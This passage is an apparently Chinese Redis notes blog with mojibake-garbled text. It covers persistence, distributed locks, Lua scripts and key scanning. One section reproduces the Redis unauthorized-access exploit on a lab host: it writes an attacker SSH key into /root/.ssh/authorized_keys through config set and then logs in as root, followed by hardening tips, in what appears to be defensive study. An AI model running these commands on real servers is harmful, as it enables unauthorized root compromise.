class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">edisä½œä¸ºå†…å­˜æ•°æ®åº“ï¼Œä¸€å…±æ”¯æŒ<span class="number">2</span>ç§æ•°æ®æŒä¹…åŒ–æ–¹æ¡ˆï¼šRDBã€AOFã€‚è¿™ä¸¤ç§æ–¹æ¡ˆæŠŠæ•°æ®å­˜å‚¨åˆ°ç£ç›˜ä¸­ï¼Œæ—¢å¯ä»¥åŒæ—¶ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥å•ç‹¬ä½¿ç”¨ï¼Œç”šè‡³éƒ½ä¸ä½¿ç”¨ï¼Œå…·ä½“ä½¿ç”¨å¯ä»¥é…ç½®ã€‚</span><br><span class="line">æŠŠæ•°æ®å­˜å‚¨åˆ°ç£ç›˜ä¸»è¦æ˜¯ä¸ºäº†ä»¥åé‡ç”¨æ•°æ®ï¼Œæˆ–è€…é˜²æ­¢ç³»ç»Ÿå‡ºç°æ•…éšœè€Œå°†æ•°æ®å¤‡ä»½åˆ°è¿œç¨‹ä½ç½®ã€‚</span><br><span class="line">rdbçš„ä¸»è¦åŸç†æ˜¯åœ¨æŸä¸ªæ—¶é—´ç‚¹ï¼ŒæŠŠå†…å­˜ä¸­æ‰€æœ‰çš„æ•°æ®åšä¸€ä»½å¿«ç…§ï¼Œç„¶åæŠŠå¿«ç…§ä¸­çš„æ•°æ®ä¿å­˜åœ¨ç£ç›˜ä¸­ã€‚</span><br><span class="line">save 900 1     #900ç§’æ—¶é—´ï¼Œè‡³å°‘æœ‰ä¸€æ¡æ•°æ®æ›´æ–°ï¼Œåˆ™ä¿å­˜åˆ°æ•°æ®æ–‡ä»¶ä¸­</span><br><span class="line">save 300 10    #300ç§’æ—¶é—´ï¼Œè‡³å°‘æœ‰10æ¡æ•°æ®æ›´æ–°ï¼Œåˆ™ä¿å­˜åˆ°æ•°æ®æ–‡ä»¶ä¸­</span><br><span class="line">save 60 10000  #60ç§’æ—¶é—´ï¼Œè‡³å°‘æœ‰10000æ¡æ•°æ®æ›´æ–°ï¼Œåˆ™ä¿å­˜åˆ°æ•°æ®æ–‡ä»¶ä¸­</span><br><span class="line">stop-writes-on-bgsave-error yes</span><br><span class="line">rdbcompression yes æŒ‡å®šå­˜å‚¨è‡³æœ¬åœ°æ•°æ®åº“æ—¶æ˜¯å¦å‹ç¼©æ•°æ®ï¼Œé»˜è®¤æ˜¯yesï¼Œredisé‡‡ç”¨LZFå‹ç¼©ï¼Œå¦‚æœä¸ºäº†èŠ‚çœCPUæ—¶é—´å¯ä»¥å…³é—­è¯¥é€‰é¡¹ï¼Œä½†ä¼šå¯¼è‡´æ•°æ®åº“æ–‡ä»¶æ‰çš„å·¨å¤§</span><br><span class="line">rdbchecksum yes å¯¹rdbæ–‡ä»¶è¿›è¡Œæ ¡éªŒ</span><br><span class="line">dbfilename <span class="string">"dump.rdb"</span></span><br><span class="line">dir <span class="string">"XXX"</span></span><br><span class="line">å½“redisçš„bgsaveå‘½ä»¤è§¦å‘æ—¶ï¼šä¼šforkä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œåœ¨æ–°è¿›ç¨‹ä¸­è¿›è¡Œå¤„ç†å¿«ç…§çš„æ“ä½œï¼Œä¸»è¿›ç¨‹ä¾æ—§å¯ä»¥æ‰§è¡Œåˆ«çš„è¯·æ±‚ã€‚</span><br><span class="line"></span><br><span class="line">aofæŒä¹…åŒ–æ˜¯å°†è¢«æ‰§è¡Œçš„å†™å‘½ä»¤ï¼Œå†™åˆ°aofæ–‡ä»¶çš„æœ«å°¾ï¼Œä»¥æ­¤æ¥è®°å½•æ•°æ®çš„å˜åŒ–ã€‚</span><br><span class="line">appendonly no   #æ˜¯å¦å¼€å¯aofã€‚é»˜è®¤æ˜¯å…³é—­çš„</span><br><span class="line"># appendfsync always       # alwaysï¼šè¡¨ç¤ºæ¯æ¬¡rediså†™æ“ä½œéƒ½ä¼šåŒæ­¥å†™å…¥ç£ç›˜ï¼Œè¿™æ ·ä¼šä¸¥é‡é™ä½redisé€Ÿåº¦ã€‚</span><br><span class="line">appendfsync everysec       # everysecï¼šè¡¨ç¤ºæ¯ç§’åŒæ­¥ä¸€æ¬¡ï¼ˆæŠ˜è¡·ï¼Œé»˜è®¤å€¼ï¼‰ï¼Œé€šè¿‡redisçš„æ—¶é—´äº‹ä»¶</span><br><span class="line"># appendfsync no     # noï¼šè¡¨ç¤ºredisä¸ä¸»åŠ¨åŒæ­¥aofæ•°æ®ã€‚ç­‰æ“ä½œç³»ç»Ÿè¿›è¡Œæ•°æ®ç¼“å­˜åŒæ­¥åˆ°ç£ç›˜(å¿«)</span><br><span class="line"></span><br><span class="line">å…¶å®redisçš„bgrewriteaofå‘½ä»¤è·Ÿbgsaveå‘½ä»¤éå¸¸ç›¸ä¼¼ã€‚éƒ½æ˜¯åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼ŒæŠŠå½“å‰çš„æ•°æ®åˆ›å»ºä¸€ä»½å¿«ç…§ï¼Œç”±å­è¿›ç¨‹è¿›è¡Œä¿å­˜ï¼Œç„¶åæ›¿ä»£ä»¥å‰çš„aofæ–‡ä»¶ï¼ˆå¹¶ä¸æ˜¯è¿½åŠ éƒ½æ–‡ä»¶æœ«å°¾ï¼‰ã€‚</span><br><span class="line">æ¯”è¾ƒå…³å¿ƒæ•°æ®ï¼Œä½†æ˜¯å¯ä»¥å¿å—å‡ åˆ†é’Ÿæ•°æ®çš„ä¸¢å¤±ï¼Œå¯ä»¥ä½¿ç”¨rdbï¼›</span><br><span class="line">ä¸å»ºè®®åªä½¿ç”¨aofï¼šå› ä¸ºrdbæ–‡ä»¶æ˜¯æ¢å¤æ•°æ®ã€å¤åˆ¶æ•°æ®çš„æœ€å¥½çš„åŠæ³•ï¼›</span><br><span class="line">å¦‚æœå¯¹æ•°æ®è¦æ±‚ç‰¹åˆ«é«˜ï¼Œå¯ä»¥åŒæ—¶ä½¿ç”¨ä¸¤ç§æ–¹æ¡ˆï¼›</span><br><span class="line">https:<span class="comment">//bettercuicui.github.io/2018/04/01/REDIS/redis%E6%95%B0%E6%8D%AE%E6%8C%81%E4%B9%85%E5%8C%96_RDB_AOF/</span></span><br></pre></td></tr></table></figure>
<h3 id="åŸºäºrediså®ç°åˆ†å¸ƒå¼é”"><a href="#åŸºäºrediså®ç°åˆ†å¸ƒå¼é”" class="headerlink" title="åŸºäºrediså®ç°åˆ†å¸ƒå¼é”"></a>åŸºäºrediså®ç°åˆ†å¸ƒå¼é”</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ret = $<span class="keyword">this</span>-&gt;getCon()-&gt;setnx($key,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span> == $ret)&#123;</span><br><span class="line">    <span class="keyword">do</span> something...</span><br><span class="line">    $<span class="keyword">this</span>-&gt;getCon()-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line">$<span class="keyword">this</span>-&gt;getCon()-&gt;multi();</span><br><span class="line">$<span class="keyword">this</span>-&gt;getCon()-&gt;setnx($key,<span class="number">1</span>);</span><br><span class="line">$<span class="keyword">this</span>-&gt;getCon()-&gt;EXPIRE($key,$time);</span><br><span class="line">$<span class="keyword">this</span>-&gt;getCon()-&gt;exec();</span><br><span class="line">$ret = $<span class="keyword">this</span>-&gt;getCon()-&gt;set($key,<span class="number">1</span>,array(<span class="string">'nx'</span>,<span class="string">'ex'</span>=&gt;self::EXP_TIME));</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span> == $ret)&#123;</span><br><span class="line">    <span class="keyword">do</span> something...</span><br><span class="line">    $<span class="keyword">this</span>-&gt;getCon()-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line">$ret = $<span class="keyword">this</span>-&gt;getCon()-&gt;set($key,$random,array(<span class="string">'nx'</span>,<span class="string">'ex'</span>=&gt;self::EXP_TIME));</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span> == $ret)&#123;</span><br><span class="line">    <span class="keyword">do</span> something...</span><br><span class="line">    <span class="keyword">if</span>($random == $<span class="keyword">this</span>-&gt;getCon()-&gt;get($key))&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;getCon()-&gt;del($key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> redis.call(<span class="string">"get"</span>,KEYS[<span class="number">1</span>]) == ARGV[<span class="number">1</span>] then</span><br><span class="line">    <span class="keyword">return</span> redis.call(<span class="string">"del"</span>,KEYS[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">end</span><br><span class="line">https:<span class="comment">//bettercuicui.github.io/2018/04/01/REDIS/%E5%9F%BA%E4%BA%8Eredis%E5%AE%9E%E7%8E%B0%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-ä½¿ç”¨-lua-è„šæœ¬"><a href="#Redis-ä½¿ç”¨-lua-è„šæœ¬" class="headerlink" title="Redis ä½¿ç”¨ lua è„šæœ¬"></a>Redis ä½¿ç”¨ lua è„šæœ¬</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">å‡å°‘ç½‘ç»œå¼€é”€ï¼Œä¸€ä¸ªè„šæœ¬åŒ…å«å¤šä¸ªå‘½ä»¤</span><br><span class="line">åŸå­æ“ä½œï¼Œ redis æ˜¯å•çº¿ç¨‹çš„ï¼ŒRedis çš„ API æ˜¯åŸå­æ€§çš„æ“ä½œï¼Œæ‰€ä»¥ä¸€ä¸ªè„šæœ¬åœ¨ Redis é‡Œé¢æ˜¯ä½œä¸ºä¸€ä¸ªæ•´ä½“æ‰§è¡Œï¼Œä¸­é€”ä¸ä¼šè¢«æ’å…¥å…¶ä»–æ“ä½œï¼Œè„šæœ¬æœ¬èº«å°±æ˜¯äº‹åŠ¡ï¼Œæ›´ç®€å•ï¼Œé€Ÿåº¦æ›´å¿«</span><br><span class="line">å¯å¤ç”¨ï¼Œå®¢æˆ·ç«¯å‘é€çš„è„šæ­¥ä¼šæ°¸ä¹…å­˜åœ¨ redis ä¸­ï¼Œè¿™æ ·ï¼Œå…¶ä»–å®¢æˆ·ç«¯å¯ä»¥å¤ç”¨è¿™ä¸€è„šæœ¬è€Œä¸éœ€è¦ä½¿ç”¨ä»£ç å®Œæˆç›¸åŒçš„é€»è¾‘</span><br><span class="line"># KEYSå’ŒARGVä¸­é—´çš„ ',' ä¸¤è¾¹çš„ç©ºæ ¼ï¼Œä¸èƒ½çœç•¥ã€‚ </span><br><span class="line">Redis-cli -h address -p port --<span class="built_in">eval</span> path/to/redis.lua KEYS[<span class="number">1</span>] KEYS[<span class="number">2</span>] , ARGV[<span class="number">1</span>] ARGV[<span class="number">2</span>] </span><br><span class="line"></span><br><span class="line">$redisHost = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$redisPort = <span class="number">6379</span>;</span><br><span class="line"><span class="comment">//å®ä¾‹åŒ–redisç±»</span></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect($redisHost, $redisPort);</span><br><span class="line">$lua = &lt;&lt;&lt;SCRIPT</span><br><span class="line">      return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;</span><br><span class="line">SCRIPT;</span><br><span class="line">//å¯¹åº”çš„rediså‘½ä»¤å¦‚ä¸‹ eval "return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;" 2 key1 key2 first second</span><br><span class="line">//2è¡¨ç¤ºKEYSçš„å€¼ä¸ºå‰2ä¸ªï¼Œå‰©ä¸‹çš„å‚æ•°ä¸ºARGV</span><br><span class="line">$s = $redis-&gt;eval($lua,array('key1','key2','first','second'),2);</span><br><span class="line">var_dump($s);</span><br><span class="line">https://learnku.com/articles/37766</span><br></pre></td></tr></table></figure>
<h3 id="redisæœªæˆæƒ-amp-å¼±å¯†ç æ¼æ´å¤ç°å’Œé˜²æŠ¤"><a href="#redisæœªæˆæƒ-amp-å¼±å¯†ç æ¼æ´å¤ç°å’Œé˜²æŠ¤" class="headerlink" title="redisæœªæˆæƒ&amp;å¼±å¯†ç æ¼æ´å¤ç°å’Œé˜²æŠ¤"></a>redisæœªæˆæƒ&amp;å¼±å¯†ç æ¼æ´å¤ç°å’Œé˜²æŠ¤</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/redis/redis.confï¼Œæ³¨é‡Šæ‰bind <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> ::<span class="number">1</span>å³è®©redisç›‘å¬æ‰€æœ‰ç½‘æ®µ</span><br><span class="line">$ redis-cli -h <span class="number">192.168</span><span class="number">.99</span><span class="number">.100</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.99</span><span class="number">.100</span>:<span class="number">6379</span>&gt; info</span><br><span class="line">å†™sshå…¬é’¥å®ç°è¿œç¨‹ç™»é™†</span><br><span class="line"></span><br><span class="line">é¦–å…ˆç”Ÿäº§å¯†é’¥å¯¹ï¼š</span><br><span class="line"> </span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">å°†å…¬é’¥åˆ¶ä½œæˆä¸Šä¼ æ–‡ä»¶ï¼š</span><br><span class="line"> </span><br><span class="line">(echo -e <span class="string">"\n\n\n"</span>; cat ~<span class="regexp">/.ssh/i</span>d_rsa.pub; echo -e <span class="string">"\n\n\n"</span>) &gt; upload.txt</span><br><span class="line">å°†ä¸Šä¼ æ–‡ä»¶ä¿å­˜åœ¨redis-cliçš„ä¸´æ—¶å˜é‡ä¸­ï¼š</span><br><span class="line"> </span><br><span class="line">cat ~<span class="regexp">/upload.txt | redis-cli -h 192.168.99.100 -x set tmp</span></span><br><span class="line"><span class="regexp">è¿æ¥redisï¼Œå°†tmpå˜é‡çš„å†…å®¹å†™å…¥/</span>root/.ssh/authorized_keys:</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">redis-cli -h <span class="number">192.168</span><span class="number">.99</span><span class="number">.100</span></span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">get tmp</span><br><span class="line">save</span><br><span class="line">æ¥ç€ä½¿ç”¨ç§é’¥å³å¯ç™»é™†é¶æœºï¼š</span><br><span class="line"> </span><br><span class="line">ssh -i ~<span class="regexp">/.ssh/i</span>d_rsa root@<span class="number">192.168</span><span class="number">.99</span><span class="number">.100</span></span><br><span class="line"></span><br><span class="line">å†™crontabæ–‡ä»¶åå¼¹shell</span><br><span class="line"></span><br><span class="line">crontabè·Ÿsshå·®ä¸å¤šï¼Œä½†æ˜¯ç¬”è€…å†ubuntu18<span class="number">.04</span>ä¸­å¤ç°å¤±è´¥ï¼ŒåŸå› æ˜¯å†™å…¥çš„crontabæ–‡ä»¶å­˜åœ¨redisçš„ä¸€äº›å­—ç¬¦ï¼Œå¯¼è‡´æ ¼å¼ä¸æ­£ç¡®</span><br><span class="line">ä½¿ç”¨apt install redis-serverçš„æ–¹å¼å®‰è£…ï¼Œå¹¶ä¸”ä½¿ç”¨service redis startå¯åŠ¨redisï¼Œè¿™æ ·redisä¼šåœ¨ä¸€ä¸ªä½æƒé™ç”¨æˆ·ä¸‹è¿è¡Œ</span><br><span class="line">[root@VM_0_11_centos ~]# ps -ef |grep redis</span><br><span class="line">redis     <span class="number">2538</span>     <span class="number">1</span>  <span class="number">0</span> Nov14 ?        <span class="number">00</span>:<span class="number">25</span>:<span class="number">57</span> /usr/bin/redis-server <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span></span><br><span class="line">root     <span class="number">16915</span>  <span class="number">8467</span>  <span class="number">0</span> <span class="number">11</span>:<span class="number">06</span> pts/<span class="number">0</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> grep --color=auto redis</span><br><span class="line"></span><br><span class="line">è‹¥å¿…é¡»ä»¥rootèº«ä»½è¿è¡Œï¼Œä¸ºredisè®¾ç½®ä¸€å®šå¼ºåº¦çš„å¯†ç ï¼ˆå®é™…å¤ç°ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œæ–°ç‰ˆredisåœ¨ä»¥rootè¿è¡Œï¼Œä¸è®¾ç½®å¯†ç çš„æƒ…å†µä¸‹ä¼šå¯åŠ¨ä¿æŠ¤æ¨¡å¼ï¼Œåªå…è®¸æœ¬åœ°cliï¼‰</span><br><span class="line">å®šæ—¶æ£€æŸ¥redisæ—¥å¿—</span><br><span class="line">cat /etc/redis.conf |grep logfile</span><br><span class="line">logfile /<span class="keyword">var</span>/log/redis/redis.log</span><br><span class="line">[root@VM_0_11_centos ~]# more /var/log/redis/redis.log</span><br><span class="line">https:<span class="comment">//anemone.top/%E7%BB%84%E4%BB%B6-redis%E6%9C%AA%E6%8E%88%E6%9D%83-%E5%BC%B1%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E9%98%B2%E6%8A%A4/</span></span><br></pre></td></tr></table></figure>
<h3 id="åˆ é™¤å¤§key"><a href="#åˆ é™¤å¤§key" class="headerlink" title="åˆ é™¤å¤§key"></a>åˆ é™¤å¤§key</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">vendor/predis/predis/src/Collection/Iterator/Keyspace.php:<span class="number">22</span></span><br><span class="line">laravel predis   https:<span class="comment">//github.com/nrk/predis/blob/v1.0/examples/redis_collections_iterators.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">5</span>; ++$i) &#123;</span><br><span class="line">    $client-&gt;sadd(<span class="string">'predis:set'</span>, <span class="string">"member:$i"</span>);</span><br><span class="line">    $client-&gt;zadd(<span class="string">'predis:zset'</span>, -$i, <span class="string">"member:$i"</span>);</span><br><span class="line">    $client-&gt;hset(<span class="string">'predis:hash'</span>, <span class="string">"field:$i"</span>, <span class="string">"value:$i"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// === Keyspace iterator based on SCAN ===</span></span><br><span class="line">echo <span class="string">'Scan the keyspace matching only our prefixed keys:'</span>, PHP_EOL;</span><br><span class="line">foreach (<span class="keyword">new</span> Iterator\Keyspace($client, <span class="string">'predis:*'</span>) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">    echo <span class="string">" - $key"</span>, PHP_EOL;$client-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* OUTPUT</span></span><br><span class="line"><span class="comment">Scan the keyspace matching only our prefixed keys:</span></span><br><span class="line"><span class="comment"> - predis:zset</span></span><br><span class="line"><span class="comment"> - predis:set</span></span><br><span class="line"><span class="comment"> - predis:hash</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scanAllForMatch</span> (<span class="params">$pattern, $cursor=null, $allResults=array(</span>)) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Zero means full iteration</span></span><br><span class="line">    <span class="keyword">if</span> ($cursor===<span class="string">"0"</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $allResults;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// No $cursor means init</span></span><br><span class="line">    <span class="keyword">if</span> ($cursor===<span class="literal">null</span>) &#123;</span><br><span class="line">        $cursor = <span class="string">"0"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The call</span></span><br><span class="line">    $result = Redis::scan($cursor, <span class="string">'match'</span>, $pattern);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Append results to array</span></span><br><span class="line">    $allResults = array_merge($allResults, $result[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Recursive call until cursor is 0</span></span><br><span class="line">    <span class="keyword">return</span> scanAllForMatch($pattern, $result[<span class="number">0</span>], $allResults);</span><br><span class="line">&#125;</span><br><span class="line">$allResults = scanAllForMatch(<span class="string">'*keypattern*'</span>);https:<span class="comment">//stackoverflow.com/questions/35477172/laravel-and-redis-scan</span></span><br><span class="line">$redis-&gt;pconnect($redisConf[<span class="number">0</span>], $redisConf[<span class="number">1</span>], $timeout);</span><br><span class="line">    <span class="comment">//é»˜è®¤SCAN_NORETRYæƒ…å†µä¸‹æœ‰å¯èƒ½ä¼šè¿”å›ç©ºæ•°ç»„ï¼Œè®¾ç½®æˆSCAN_RETRYï¼Œå¦‚æœæ˜¯ç©ºæ•°ç»„çš„è¯ï¼Œå°†ä¸è¿”å›ç»§ç»­æ‰«æä¸‹å»</span></span><br><span class="line">    $redis-&gt;setOption(\Redis::OPT_SCAN, \Redis::SCAN_RETRY);</span><br><span class="line">    $it = NULL;</span><br><span class="line">    <span class="keyword">while</span> ($arr_keys = $redis-&gt;scan($it, <span class="attr">CacheKeyConfig</span>::CachePre.<span class="string">'*'</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($arr_keys)) &#123;</span><br><span class="line">            <span class="comment">//æ¨èä½¿ç”¨unlinkå‡½æ•°ï¼Œéé˜»å¡åˆ é™¤ï¼Œåˆ é™¤å¤§keyæ—¶å¾ˆå¥½ç”¨ï¼Œä½†æ˜¯å®ƒéœ€è¦redisç‰ˆæœ¬&gt;=4.0</span></span><br><span class="line">            $result = $redis-&gt;del($arr_keys);</span><br><span class="line">                echo $result . PHP_EOL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">é“¾æ¥ï¼šhttps:<span class="comment">//juejin.im/post/5cf4e52e6fb9a07ecd3d46fe</span></span><br><span class="line"> $it = NULL;</span><br><span class="line"> <span class="keyword">while</span>($arr_keys = $redis-&gt;scan($it, <span class="string">"mykey:*"</span>, <span class="number">10000</span>)) &#123;</span><br><span class="line">     foreach($arr_keys <span class="keyword">as</span> $str_key) &#123;</span><br><span class="line">         echo <span class="string">"Here is a key: $str_key\n"</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> $pattern_arr=[];</span><br><span class="line">         $pattern_arr[<span class="string">'COUNT'</span>] = <span class="number">10</span>;</span><br><span class="line"> $cursor = <span class="literal">null</span>;$i=<span class="number">0</span>;</span><br><span class="line">         <span class="keyword">while</span>($cursor !== <span class="number">0</span>)&#123;</span><br><span class="line">             <span class="comment">// å‘½ä»¤ä½ç½® vendor\predis\predis\src\Command\HashScan.php</span></span><br><span class="line">             $info = $redis-&gt;hscan(<span class="string">'news:all'</span>, $cursor, $pattern_arr);</span><br><span class="line">             $cursor = intval($info[<span class="number">0</span>]);dump(count($info[<span class="number">1</span>]));</span><br><span class="line">             $list = $info[<span class="number">1</span>] ?$info[<span class="number">1</span>]: [];$i++;</span><br><span class="line">             <span class="keyword">if</span>($list)&#123;</span><br><span class="line">                 $del_field = [];</span><br><span class="line">                 foreach($list <span class="keyword">as</span> $field=&gt;$v)&#123;</span><br><span class="line">                     $del_field[] = $field;</span><br><span class="line">                 &#125;</span><br><span class="line">                 dump(count($del_field),$i);</span><br><span class="line">                 $redis-&gt;hdel(<span class="string">'news:all'</span>, $del_field);</span><br><span class="line">                 <span class="keyword">if</span> ($i &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line"> $cursor = <span class="number">0</span>;$i=<span class="number">0</span>;</span><br><span class="line"> <span class="keyword">do</span></span><br><span class="line">         &#123;</span><br><span class="line"> <span class="comment">//            $arr_keys = $redis-&gt;scan($it, 'app:read:news:uuid:*', $pattern_arr);</span></span><br><span class="line">             $arr_keys = $redis-&gt;scan($cursor, <span class="string">'match'</span>, <span class="string">'app:read:news:uuid:*'</span>);dump($arr_keys);</span><br><span class="line">             <span class="keyword">if</span> (is_array($arr_keys) &amp;&amp; !empty($arr_keys))</span><br><span class="line">             &#123;</span><br><span class="line">                 foreach ($arr_keys <span class="keyword">as</span> $str_key)</span><br><span class="line">                 &#123;</span><br><span class="line">                     dump($str_key);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125; <span class="keyword">while</span> ($arr_keys !== <span class="literal">false</span>);</span><br><span class="line"> http:<span class="comment">//doc.redisfans.com/key/scan.html</span></span><br></pre></td></tr></table></figure>
<h3 id="redisä¸­çš„å¹¶å‘é—®é¢˜"><a href="#redisä¸­çš„å¹¶å‘é—®é¢˜" class="headerlink" title="redisä¸­çš„å¹¶å‘é—®é¢˜"></a>redisä¸­çš„å¹¶å‘é—®é¢˜</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">"vendor/autoload.php"</span>;</span><br><span 